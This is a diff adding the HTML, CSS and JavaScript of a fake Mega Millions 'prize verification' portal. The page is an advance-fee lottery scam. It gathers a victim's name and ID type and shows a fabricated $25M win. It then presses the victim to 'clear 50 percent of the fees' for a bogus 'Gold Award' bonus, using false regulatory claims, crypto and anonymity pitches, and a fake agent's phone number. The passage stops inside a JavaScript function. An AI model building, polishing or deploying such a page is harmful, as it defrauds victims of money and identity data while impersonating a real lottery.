@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mega Millions | Secure Verification Portal</title>
+    
+    <!-- Official Favicon -->
+    <link rel="icon" href="https://www.megamillions.com/favicon.ico" type="image/x-icon">
+    
+    <!-- Mega Millions Typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,400;0,600;0,700;0,800;1,400;1,700;1,800&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Confetti Library -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+    <style>
+        /* --- GLOBAL & RESETS --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Open Sans', sans-serif; background-color: #f4f6f8; color: #333; overflow-x: hidden; }
+        .hidden { display: none !important; }
+
+        /* --- HEADER --- */
+        header {
+            background-color: white; display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 5%; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: relative; z-index: 50;
+        }
+        .header-logo { height: 75px; width: auto; object-fit: contain; cursor: pointer; transition: transform 0.2s; }
+        .header-logo:hover { transform: scale(1.02); }
+        .main-nav { display: flex; gap: 25px; align-items: center; }
+        .main-nav a {
+            text-decoration: none; color: #0056a8; font-family: 'Montserrat', sans-serif;
+            font-size: 14px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; transition: color 0.2s;
+        }
+        .main-nav a:hover { color: #d50032; }
+
+        /* --- VIEW 1: LOGIN HERO SECTION --- */
+        .hero-section {
+            background: radial-gradient(circle at top, #187bcd, #004c97);
+            position: relative; padding: 60px 5%; display: flex; justify-content: center; align-items: center; gap: 50px;
+            min-height: calc(100vh - 105px); overflow: hidden; transition: opacity 0.5s ease-out;
+        }
+        .hero-section::before, .dashboard-section::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cpath fill='rgba(255,255,255,0.05)' d='M20,10 L22,16 L28,16 L23,20 L25,26 L20,22 L15,26 L17,20 L12,16 L18,16 Z'/%3E%3Cpath fill='rgba(255,255,255,0.03)' d='M150,80 L153,88 L161,88 L155,93 L157,101 L150,96 L143,101 L145,93 L139,88 L147,88 Z'/%3E%3Cpath fill='rgba(255,255,255,0.04)' d='M250,220 L253,228 L261,228 L255,233 L257,241 L250,236 L243,241 L245,233 L239,228 L247,228 Z'/%3E%3C/svg%3E");
+            pointer-events: none; z-index: 1;
+        }
+        .left-content { flex: 1; max-width: 650px; text-align: center; position: relative; z-index: 2; }
+        .main-title { color: white; font-family: 'Montserrat', sans-serif; font-size: 52px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px; text-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .balls-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
+        .ball { width: 85px; height: 85px; background: radial-gradient(circle at 35% 35%, #ffffff, #e0e0e0); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: black; font-family: 'Montserrat', sans-serif; font-size: 42px; font-weight: 800; font-style: italic; box-shadow: inset -6px -6px 12px rgba(0,0,0,0.15), 0 8px 15px rgba(0,0,0,0.3); }
+        .ball.mega { background: radial-gradient(circle at 35% 35%, #ffea75, #ffc72c); box-shadow: inset -6px -6px 12px rgba(200,150,0,0.4), 0 8px 15px rgba(0,0,0,0.3); }
+        .date-text { color: white; font-size: 18px; font-style: italic; font-family: 'Montserrat', sans-serif; margin-bottom: 30px; letter-spacing: 1px;}
+        .divider-row { display: flex; align-items: center; justify-content: center; margin: 30px 0; width: 100%; }
+        .divider-line { flex: 1; height: 1px; background-color: #ffc72c; max-width: 200px; }
+        .pill-btn-outline { background: transparent; color: #ffc72c; border: 2px solid #ffc72c; padding: 10px 30px; border-radius: 50px; font-family: 'Montserrat', sans-serif; font-size: 16px; font-weight: 600; margin: 0 20px;}
+
+        .right-box { background: linear-gradient(145deg, #00458a, #001f44); border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5); position: relative; z-index: 2; }
+        .right-title-yellow { color: #ffc72c; font-family: 'Montserrat', sans-serif; font-size: 20px; font-weight: 700; margin-bottom: 5px; }
+        .right-title-white { color: white; font-family: 'Montserrat', sans-serif; font-size: 38px; font-weight: 800; font-style: italic; line-height: 1.1; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 18px; }
+        .input-group label { display: block; color: white; font-family: 'Montserrat', sans-serif; font-size: 12px; font-weight: 600; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .input-group input, .input-group select { width: 100%; padding: 14px 15px; border-radius: 6px; border: none; font-family: 'Open Sans', sans-serif; font-size: 15px; outline: none; background: #fff; }
+        .input-group input:focus, .input-group select:focus { box-shadow: 0 0 0 3px rgba(255, 199, 44, 0.5); }
+        .blue-submit-btn { background-color: #ffc72c; color: #001f44; border: none; border-radius: 50px; padding: 16px; width: 100%; font-family: 'Montserrat', sans-serif; font-size: 16px; font-weight: 800; margin-top: 15px; cursor: pointer; text-transform: uppercase; transition: all 0.3s; }
+        .blue-submit-btn:hover { background-color: #e6b320; transform: translateY(-2px); }
+
+        /* --- VIEW 2: DASHBOARD SECTION --- */
+        .dashboard-section { display: none; background: radial-gradient(circle at center, #002b5e, #001024); min-height: calc(100vh - 105px); padding: 60px 5%; position: relative; color: white; animation: fadeIn 1s forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .dash-container { max-width: 1200px; margin: 0 auto; position: relative; z-index: 2; }
+        .dash-header { text-align: center; margin-bottom: 50px; }
+        .dash-welcome { font-family: 'Montserrat', sans-serif; font-size: 14px; color: #ffc72c; letter-spacing: 3px; text-transform: uppercase; font-weight: 700; margin-bottom: 15px; }
+        .dash-tier { font-family: 'Montserrat', sans-serif; font-size: 32px; font-weight: 700; margin-bottom: 15px; }
+        .dash-counter { font-family: 'Montserrat', sans-serif; font-size: 80px; font-weight: 800; color: #ffc72c; line-height: 1; margin-bottom: 10px; text-shadow: 0 5px 20px rgba(255, 199, 44, 0.2); }
+        .dash-subtext { font-size: 12px; color: #aaa; letter-spacing: 1.5px; }
+
+        .dash-grid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 40px; }
+        .dash-card { background: rgba(0, 31, 68, 0.6); border: 1px solid rgba(255,255,255,0.05); border-top: 4px solid #ffc72c; border-radius: 12px; padding: 40px; backdrop-filter: blur(10px); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        .card-heading { font-family: 'Montserrat', sans-serif; font-size: 22px; color: #ffc72c; font-weight: 700; margin-bottom: 25px; }
+        .vehicle-img { width: 100%; height: auto; border-radius: 8px; margin-bottom: 30px; box-shadow: 0 10px 20px rgba(0,0,0,0.4); object-fit: cover; }
+        
+        .breakdown-table { width: 100%; border-collapse: collapse; }
+        .breakdown-table th, .breakdown-table td { padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.1); text-align: left; font-size: 15px; }
+        .breakdown-table th { color: #ccc; font-weight: 400; }
+        .breakdown-table td { font-family: 'Montserrat', sans-serif; text-align: right; font-weight: 600; color: white;}
+        .breakdown-table tr:last-child th, .breakdown-table tr:last-child td { border-bottom: none; padding-bottom: 0; font-size: 18px; color: #ffc72c; }
+
+        .stepper { margin-bottom: 40px; }
+        .step { display: flex; align-items: center; margin-bottom: 25px; color: #888; font-weight: 600; font-size: 15px; }
+        .step.active { color: white; }
+        .step-icon { width: 35px; height: 35px; border-radius: 50%; border: 2px solid #555; display: flex; justify-content: center; align-items: center; margin-right: 15px; font-family: 'Montserrat', sans-serif; font-weight: 700; font-size: 14px; transition: all 0.3s; }
+        .step.active .step-icon { background: #ffc72c; color: #001f44; border: none; box-shadow: 0 0 15px rgba(255, 199, 44, 0.4); }
+
+        .tax-info { background: rgba(255, 255, 255, 0.05); padding: 25px; border-radius: 8px; border-left: 4px solid #d50032; margin-bottom: 40px; }
+        .tax-info h4 { font-family: 'Montserrat', sans-serif; margin-bottom: 15px; color: white; font-size: 16px;}
+        .tax-info p { font-size: 13px; color: #ccc; line-height: 1.6; margin-bottom: 12px; }
+        .tax-info p:last-child { margin-bottom: 0; }
+
+        /* Animated Gold Button */
+        .gold-pulse-btn {
+            position: relative; background: linear-gradient(45deg, #d4af37, #ffea75, #d4af37, #ffc72c); background-size: 300% 300%;
+            color: #001024; border: none; border-radius: 50px; padding: 20px; width: 100%; font-family: 'Montserrat', sans-serif;
+            font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
+            animation: goldShine 4s ease infinite, pulseGlow 2s infinite; box-shadow: 0 0 20px rgba(255, 199, 44, 0.6); overflow: hidden; z-index: 1;
+        }
+        .gold-pulse-btn::after {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: rgba(255, 255, 255, 0.2); transform: rotate(45deg); z-index: -1; animation: shineSweep 3s infinite;
+        }
+
+        @keyframes goldShine { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        @keyframes pulseGlow { 0% { transform: scale(1); box-shadow: 0 0 15px rgba(255, 199, 44, 0.5); } 50% { transform: scale(1.03); box-shadow: 0 0 30px rgba(255, 199, 44, 0.9); } 100% { transform: scale(1); box-shadow: 0 0 15px rgba(255, 199, 44, 0.5); } }
+        @keyframes shineSweep { 0% { left: -100%; transition-property: left; } 50% { left: 100%; transition-property: left; } 100% { left: 100%; } }
+
+        /* --- VIEW 3: GOLD AWARD MEMBERSHIP BONUS PAGE --- */
+        #view-gold-program { display: none; background-color: #000a18; color: white; animation: fadeIn 1s forwards; }
+
+        .gold-hero { position: relative; min-height: calc(100vh - 105px); display: flex; justify-content: center; align-items: center; overflow: hidden; padding: 40px 5%; }
+        
+        .split-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; z-index: 0; }
+        .bg-left { flex: 1; background: url('https://images.unsplash.com/photo-1618221195710-dd6b41faaea6?auto=format&fit=crop&w=1200&q=80') center/cover; }
+        .bg-right { flex: 1; background: url('https://images.unsplash.com/photo-1544465544-1b71aee9dfa3?auto=format&fit=crop&w=1200&q=80') center/cover; }
+        
+        .gold-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 16, 36, 0.85); z-index: 1; }
+
+        .gold-plaque {
+            background: linear-gradient(145deg, #0a192f, #001024); border: 3px solid #ffc72c; border-radius: 16px;
+            padding: 60px 50px; max-width: 750px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 0 40px rgba(255, 199, 44, 0.1);
+            position: relative; z-index: 2; width: 100%;
+        }
+        .plaque-badge {
+            position: absolute; top: -40px; left: 50%; transform: translateX(-50%); width: 80px; height: 80px;
+            background: #ffc72c; border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            font-size: 40px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); border: 4px solid #001024;
+        }
+
+        .gold-title { font-family: 'Montserrat', sans-serif; font-size: 28px; color: white; font-weight: 800; text-transform: uppercase; margin-bottom: 10px; margin-top: 20px; }
+        .gold-bonus-amt { font-family: 'Montserrat', sans-serif; font-size: 65px; font-weight: 800; color: #ffc72c; line-height: 1; margin-bottom: 25px; text-shadow: 0 5px 20px rgba(255, 199, 44, 0.3); }
+        .gold-description { font-size: 18px; color: #e0e0e0; line-height: 1.6; padding: 0 20px; }
+        .gold-highlight { color: #ffc72c; font-weight: 700; }
+
+        /* Extended Scroll Content */
+        .gold-extended-content { position: relative; z-index: 10; background: #000a18; padding: 80px 5%; border-top: 2px solid #ffc72c; }
+        .section-wrap { max-width: 1200px; margin: 0 auto; margin-bottom: 80px; }
+        .section-title { font-family: 'Montserrat', sans-serif; font-size: 32px; font-weight: 800; color: #ffc72c; text-align: center; margin-bottom: 50px; text-transform: uppercase; letter-spacing: 1px; }
+
+        .crypto-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
+        .crypto-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,199,44,0.3); border-radius: 12px; padding: 35px; transition: transform 0.3s, box-shadow 0.3s; }
+        .crypto-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(255,199,44,0.15); border-color: #ffc72c; }
+        .crypto-icon { font-size: 40px; margin-bottom: 20px; }
+        .crypto-card h4 { font-family: 'Montserrat', sans-serif; font-size: 18px; color: white; margin-bottom: 15px; }
+        .crypto-card p { font-size: 14px; color: #bbb; line-height: 1.6; }
+
+        .faq-item { background: rgba(255,255,255,0.02); border-left: 4px solid #ffc72c; padding: 30px; margin-bottom: 25px; border-radius: 4px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .faq-item h4 { font-family: 'Montserrat', sans-serif; font-size: 18px; color: #ffc72c; margin-bottom: 15px; }
+        .faq-item p { font-size: 15px; color: #e0e0e0; line-height: 1.7; }
+
+        .final-action { text-align: center; padding: 40px 0; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 40px; }
+        
+        .contact-agent-btn {
+            background-color: #d50032; color: white; border: none; border-radius: 50px; padding: 20px 50px;
+            font-family: 'Montserrat', sans-serif; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase;
+            transition: all 0.3s; box-shadow: 0 10px 20px rgba(213, 0, 50, 0.4); width: 100%; max-width: 400px;
+        }
+        .contact-agent-btn:hover { background-color: #a80026; transform: translateY(-3px); box-shadow: 0 15px 25px rgba(213, 0, 50, 0.6); }
+
+        /* --- MODALS (Agent & Tax Info) --- */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 10, 25, 0.85); backdrop-filter: blur(8px);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.3s;
+            padding: 20px;
+        }
+        .modal-overlay.active { opacity: 1; pointer-events: auto; }
+        
+        .modal-card {
+            background: linear-gradient(145deg, #00458a, #001f44); border: 2px solid #ffc72c;
+            border-radius: 16px; padding: 40px 30px; width: 100%; max-width: 420px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            transform: translateY(20px); transition: transform 0.3s; color: white; position: relative;
+            max-height: 90vh; overflow-y: auto;
+        }
+        .modal-overlay.active .modal-card { transform: translateY(0); }
+        
+        .modal-close {
+            position: absolute; top: 15px; right: 20px; color: #aaa; font-size: 28px;
+            cursor: pointer; background: none; border: none; transition: color 0.2s;
+        }
+        .modal-close:hover { color: #ffc72c; }
+        
+        /* Agent Specific Modal Styles */
+        .agent-icon { font-size: 60px; margin-bottom: 10px; }
+        .agent-role { font-size: 12px; color: #ccc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        .agent-name { font-family: 'Montserrat', sans-serif; font-size: 32px; font-weight: 800; color: #ffc72c; margin-bottom: 25px; }
+        .agent-phone { font-family: 'Montserrat', sans-serif; font-size: 36px; font-weight: 800; color: white; margin-bottom: 30px; text-shadow: 0 2px 5px rgba(0,0,0,0.3); }
+        
+        /* Modal Buttons */
+        .call-btn {
+            background: #d50032; color: white; text-decoration: none; padding: 18px 30px; border: none;
+            border-radius: 50px; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 18px;
+            display: inline-block; width: 100%; box-shadow: 0 5px 15px rgba(213,0,50,0.4); text-transform: uppercase;
+            transition: background 0.3s; cursor: pointer;
+        }
+        .call-btn:hover { background: #a80026; }
+
+        /* --- MOBILE OPTIMIZATIONS --- */
+        @media (max-width: 768px) {
+            header { flex-direction: column; gap: 15px; padding: 15px 20px; }
+            .main-nav { flex-wrap: wrap; justify-content: center; gap: 15px; }
+            
+            .hero-section { flex-direction: column; padding: 40px 20px; gap: 30px; }
+            .main-title { font-size: 36px; }
+            .balls-container { gap: 8px; }
+            .ball { width: 45px; height: 45px; font-size: 24px; }
+            .right-box { padding: 30px 20px; width: 100%; }
+            .right-title-white { font-size: 32px; }
+
+            .dashboard-section { padding: 40px 20px; }
+            .dash-grid { grid-template-columns: 1fr; gap: 30px; }
+            .dash-tier { font-size: 22px; }
+            .dash-counter { font-size: 45px; }
+            .dash-card { padding: 25px 20px; }
+            .card-heading { font-size: 18px; }
+            .breakdown-table th, .breakdown-table td { font-size: 13px; }
+            .breakdown-table tr:last-child th, .breakdown-table tr:last-child td { font-size: 16px; }
+            
+            .gold-hero { padding: 40px 20px; }
+            .split-bg { flex-direction: column; }
+            .bg-left, .bg-right { flex: 1; min-height: 50vh; }
+            .gold-plaque { padding: 40px 20px; }
+            .gold-title { font-size: 24px; }
+            .gold-bonus-amt { font-size: 42px; }
+            .gold-description { font-size: 15px; padding: 0; }
+            
+            .gold-extended-content { padding: 50px 20px; }
+            .section-title { font-size: 24px; margin-bottom: 30px; }
+            .faq-item { padding: 20px; }
+            
+            .modal-card { padding: 30px 20px; }
+            .agent-phone { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- GLOBAL HEADER -->
+    <header>
+        <!-- Clicking Logo brings you back to login screen -->
+        <img src="mega-logo.png" alt="Mega Millions" class="header-logo">
+        
+        <!-- Navigation Buttons -->
+        <nav class="main-nav">
+            <a href="#" onclick="resetToHome()">CLAIM PORTAL ∨</a>
+            <a href="#" onclick="showTaxModal(event)">TAX INFO ∨</a>
+            <a href="#" onclick="showTaxModal(event)">PRIZE DETAILS</a>
+            <a href="#" onclick="showAgentModal(event)">AGENT VERIFICATION</a>
+        </nav>
+    </header>
+
+    <!-- VIEW 1: FRONT PAGE (Login Portal) -->
+    <div id="view-login" class="hero-section">
+        <div class="left-content">
+            <h1 class="main-title">Prize Verification</h1>
+            <div class="balls-container">
+                <div class="ball">8</div><div class="ball">5</div><div class="ball">9</div>
+                <div class="ball">2</div><div class="ball">J</div><div class="ball mega">B</div>
+            </div>
+            <p class="date-text">AWAITING CLAIM ID CONFIRMATION</p>
+            <div class="divider-row">
+                <div class="divider-line"></div>
+                <div class="pill-btn-outline">Official Documentation</div>
+                <div class="divider-line"></div>
+            </div>
+        </div>
+
+        <div class="right-box">
+            <div class="right-title-yellow">Secure Verification</div>
+            <div class="right-title-white">Claim Portal</div>
+            <form onsubmit="handleLogin(event)">
+                <div class="input-group">
+                    <label>Claim ID</label>
+                    <input type="text" id="claimId" value="MM-8592-JB" required>
+                </div>
+                <div class="input-group">
+                    <label>Full Legal Name</label>
+                    <input type="text" id="fullName" placeholder="e.g. Mr McMillan" required>
+                </div>
+                <div class="input-group">
+                    <label>Government ID Type</label>
+                    <select required>
+                        <option value="">Select ID Type...</option>
+                        <option value="passport">Valid Passport</option>
+                        <option value="drivers">Driver's Licence</option>
+                        <option value="voter">National Voter ID</option>
+                    </select>
+                </div>
+                <button type="submit" id="submitBtn" class="blue-submit-btn">Secure Verification</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- VIEW 2: DASHBOARD -->
+    <div id="view-dashboard" class="dashboard-section">
+        <div class="dash-container">
+            <div class="dash-header">
+                <div class="dash-welcome">CONGRATULATIONS, <span id="display-name">WINNER</span></div>
+                <h1 class="dash-tier">You are a Verified Tier 1 Winner.</h1>
+                <div class="dash-counter" id="cash-counter">$0</div>
+                <div class="dash-subtext">TOTAL PRIZE VALUE ESTIMATE (USD)</div>
+            </div>
+
+            <div class="dash-grid">
+                <!-- LEFT CARD: Vehicle & Table -->
+                <div class="dash-card">
+                    <h3 class="card-heading">Your Luxury Vehicle</h3>
+                    
+                    <!-- USER UPLOADED IMAGE (Local File) -->
+                    <!-- Make sure the uploaded image is named mercedes.jpg and is in the same folder -->
+                    <img src="mercedez.jpeg" 
+     alt="2025 Mercedes-AMG E - Luxury Prize" 
+     class="vehicle-img">
+                    
+                    <h3 class="card-heading" style="margin-top: 10px;">Winnings Breakdown</h3>
+                    <table class="breakdown-table">
+                        <tr><th>Cash Grand Prize</th><td>$25,000,000.00</td></tr>
+                        <tr><th>2025 Mercedes-AMG E</th><td>FMV Covered</td></tr>
+                        <tr><th>Registration & Title Fees</th><td>Covered by MM</td></tr>
+                        <tr><th>Total Package Value</th><td>$25,645,000.00</td></tr>
+                    </table>
+                </div>
+
+                <!-- RIGHT CARD: Stepper & Animated Gold Button -->
+                <div class="dash-card">
+                    <h3 class="card-heading">Next Steps</h3>
+                    <div class="stepper">
+                        <div class="step active"><div class="step-icon">✓</div><div>Identity Verification Complete</div></div>
+                        <div class="step"><div class="step-icon">2</div><div>Access Gold Award Membership</div></div>
+                        <div class="step"><div class="step-icon">3</div><div>Contact Your Dedicated Prize Agent</div></div>
+                    </div>
+
+                    <!-- EXPANDED TAX INFO -->
+                    <div class="tax-info">
+                        <h4>Tax Information & Privacy Note</h4>
+                        <p>Pursuant to federal and local tax regulations, your cash winnings may be subject to a standard withholding rate. A simulated estimated net payout after standard deductions is strictly confidential.</p>
+                        <p>In accordance with IRS guidelines, luxury non-cash prizes (such as vehicles) require W-2G tax reporting based on Fair Market Value (FMV). State-level tax liabilities may vary.</p>
+                        <p>Furthermore, an encrypted ledger has been generated to ensure complete anonymity of your digital asset transfers. Please keep all assigned claim codes and corresponding documentation completely confidential until your escrow clears.</p>
+                    </div>
+
+                    <!-- Animated Gold Button -->
+                    <button class="gold-pulse-btn" onclick="showGoldProgram()">
+                        Unlock Gold Award Bonus ➔
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIEW 3: GOLD AWARD MEMBERSHIP BONUS PAGE -->
+    <div id="view-gold-program">
+        
+        <!-- HERO SECTION (Split Background) -->
+        <div class="gold-hero">
+            <div class="split-bg">
+                <div class="bg-left"></div> <!-- Luxury Office -->
+                <div class="bg-right"></div> <!-- Luxury Family Vacation -->
+            </div>
+            
+            <div class="gold-overlay"></div>
+
+            <div class="gold-plaque">
+                <div class="plaque-badge">⭐</div>
+                <h2 class="gold-title">Gold Award Program</h2>
+                <div class="gold-bonus-amt" id="gold-counter">$0</div>
+                <p class="gold-description">
+                    You are enlisted in the exclusive Gold Award Program, which consists of an additional <span class="gold-highlight">5.5 Million Dollars</span>. 
+                    <br><br>
+                    You are required to clear 50 percent of the fees to get enrolled and verified for this elite tier before your full funds can be securely routed.
+                </p>
+                <div style="margin-top: 20px; font-size: 14px; color: #aaa;">Scroll down to view your exclusive benefits ↓</div>
+            </div>
+        </div>
+
+        <!-- SCROLLING CONTENT SECTION -->
+        <div class="gold-extended-content">
+            
+            <!-- Crypto & Digital Assets Section -->
+            <div class="section-wrap">
+                <h3 class="section-title">Elite Digital Asset & Bitcoin Benefits</h3>
+                <div class="crypto-grid">
+                    <div class="crypto-card">
+                        <div class="crypto-icon">₿</div>
+                        <h4>Bitcoin Allocation Bonus</h4>
+                        <p>As a Gold Member, you have the exclusive option to receive up to 25% of your $5.5M bonus directly in Bitcoin (BTC) for maximum financial privacy and untethered global market growth.</p>
+                    </div>
+                    <div class="crypto-card">
+                        <div class="crypto-icon">🛡️</div>
+                        <h4>Institutional Cold Storage</h4>
+                        <p>Your digital wealth will be secured in state-of-the-art, multi-signature offline cold storage vaults. We provide military-grade security to ensure your assets remain impervious to cyber threats.</p>
+                    </div>
+                    <div class="crypto-card">
+                        <div class="crypto-icon">💱</div>
+                        <h4>Private OTC Trading Desk</h4>
+                        <p>Bypass public exchanges. You are granted access to our private Over-The-Counter (OTC) trading desk, allowing you to execute massive cryptocurrency liquidations with zero market slippage and total anonymity.</p>
+                    </div>
+                    <div class="crypto-card">
+                        <div class="crypto-icon">🌐</div>
+                        <h4>Web3 Wealth Concierge</h4>
+                        <p>Receive 1-on-1 consultations with elite blockchain analysts to navigate the digital economy, set up zero-tax routing strategies, and build a generational digital portfolio.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FAQ Section -->
+            <div class="section-wrap">
+                <h3 class="section-title">Membership Perks & Benefits FAQ</h3>
+                <div class="faq-item">
+                    <h4>Q: What exclusive lifestyle perks are included with the Gold Award?</h4>
+                    <p><strong>A:</strong> Beyond your cash prize, Gold Award Members receive a 24/7 global luxury concierge. This includes VIP access to high-net-worth events, private jet charter allowances, and all-expenses-paid premium bookings at 5-star resorts worldwide for you and your entire family.</p>
+                </div>
+                <div class="faq-item">
+                    <h4>Q: Why am I required to clear 50% of the fees upfront?</h4>
+                    <p><strong>A:</strong> To comply with international financial regulations and anti-money laundering (AML) laws, an encrypted escrow protocol must be activated. Clearing 50% of these administrative fees verifies your identity, establishes a secure banking ledger, and guarantees the immediate, unhindered release of your $5.5M bonus.</p>
+                </div>
+                <div class="faq-item">
+                    <h4>Q: Do I get a dedicated wealth management team?</h4>
+                    <p><strong>A:</strong> Yes. Upon full verification, you are assigned a Tier 1 Platinum Financial Advisory team. They specialize in ultra-high-net-worth tax shielding, global real estate acquisitions, and anonymous offshore account structuring to protect your newfound wealth.</p>
+                </div>
+            </div>
+
+            <!-- Final Action / Contact Agent -->
+            <div class="final-action">
+                <p style="color: #ccc; font-size: 16px; margin-bottom: 25px;">Ready to clear your fees and activate your Gold Award Membership?</p>
+                <button class="contact-agent-btn" onclick="showAgentModal(event)">
+                    Contact My Agent Now
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- CONTACT AGENT MODAL -->
+    <div id="agentModal" class="modal-overlay">
+        <div class="modal-card">
+            <button class="modal-close" onclick="closeAgentModal()">×</button>
+            <div class="agent-icon">👤</div>
+            <div class="agent-role">Dedicated Prize Agent</div>
+            <div class="agent-name">Bill Bradley</div>
+            
+            <div style="margin: 25px 0;">
+                <!-- Phone number removed available hours per request -->
+                <div class="agent-phone">334-438-5143</div>
+            </div>
+            
+            <!-- Link initiates a phone call on mobile devices -->
+            <a href="tel:6232824927" class="call-btn">Tap to Call Now</a>
+        </div>
+    </div>
+
+    <!-- TAX INFO / PRIZE DETAILS MODAL -->
+    <div id="taxModal" class="modal-overlay">
+        <div class="modal-card" style="max-width: 600px; text-align: left;">
+            <button class="modal-close" onclick="closeTaxModal()">×</button>
+            <h3 style="color: #ffc72c; margin-bottom: 20px; text-align: center; font-family: 'Montserrat', sans-serif;">Tax Information & IRS Withholding</h3>
+            
+            <p style="font-size: 14px; margin-bottom: 20px; color: #e0e0e0; line-height: 1.6;">As a legitimate lottery organization operating within the United States, we are required by law to adhere strictly to the Internal Revenue Service (IRS) tax codes regarding gambling winnings and prizes.</p>
+            
+            <h4 style="color: white; margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 5px;">Federal Tax Withholding</h4>
+            <p style="font-size: 14px; margin-bottom: 15px; color: #bbb; line-height: 1.6;">Lottery agencies are required to withhold 24% of any prize over $5,000 for federal taxes immediately upon payout.</p>
+            <ul style="font-size: 14px; color: #bbb; margin-left: 20px; margin-bottom: 25px; line-height: 1.8;">
+                <li><strong>Gross Cash Prize:</strong> $25,000,000.00</li>
+                <li><strong>Federal Tax Withholding (24%):</strong> -$6,000,000.00</li>
+                <li><strong>Net Cash Payout:</strong> $19,000,000.00</li>
+            </ul>
+            
+            <h4 style="color: white; margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 5px;">Taxation on the Vehicle</h4>
+            <p style="font-size: 14px; margin-bottom: 25px; color: #bbb; line-height: 1.6;">The 2025 Mercedes-AMG E is considered "non-cash income." The Fair Market Value (FMV) of this vehicle will be reported on your IRS Form W-2G and added to your total annual income. State-level taxes may vary depending on your permanent residence.</p>
+            
+            <div style="text-align: center;">
+                <button class="call-btn" onclick="closeTaxModal()" style="width: auto; padding: 12px 35px;">Acknowledge</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT -->
+    <script>
+        // Go back to the main login screen
+        function resetToHome() {
+            document.getElementById('view-login').style.display = 'flex';
+            document.getElementById('view-dashboard').style.display = 'none';
+            document.getElementById('view-gold-program').style.display = 'none';
+            
+            // Reset button state
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = "Secure Verification";
+            btn.style.opacity = "1";
+            btn.style.cursor = "pointer";
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Form Submission -> Move to View 2 (Dashboard)
+        function handleLogin(event) {
+            event.preventDefault(); 
+            const btn = document.getElementById('submitBtn');
+            const nameInput = document.getElementById('fullName').value.trim();
+
+            btn.innerHTML = "Verifying Identity...";
+            btn.style.opacity = "0.8";
+            btn.style.cursor = "wait";
+
+            setTimeout(() => {
+                const firstName = nameInput.split(' ')[0] || 'Winner';
+                document.getElementById('display-name').innerText = firstName;
+
+                document.getElementById('view-login').style.display = 'none';
+                document.getElementById('view-dashboard').style.display = 'block';
+
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+
+                fireMegaConfetti();
+                animateCounter("cash-counter", 0, 25000000, 2500); // Counts to 8.5M
+            }, 1500);
+        }
+
+        // Click Gold Button -> Move to View 3 (Gold Program)
+        function showGoldProgram() {
+            document.getElementById('view-dashboard').style.display = 'none';
+            document.getElementById('view-gold-program').style.display = 'block';
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            firePureGoldConfetti();
+            
+            // Wait slightly for visual impact, then count up to $5,500,000
+            setTimeout(() => {
+                animateCounter("gold-counter", 0, 5500000, 2500);
+            }, 500);
+        }
+
+        // --- Modal Controls ---
+        
+        // Agent Modal
+        function showAgentModal(e) {
+            if(e) e.preventDefault();
+            document.getElementById('agentModal').classList.add('active');
+        }
+        function closeAgentModal() {
+            document.getElementById('agentModal').classList.remove('active');
+        }
+
+        // Tax Info Modal
+        function showTaxModal(e) {
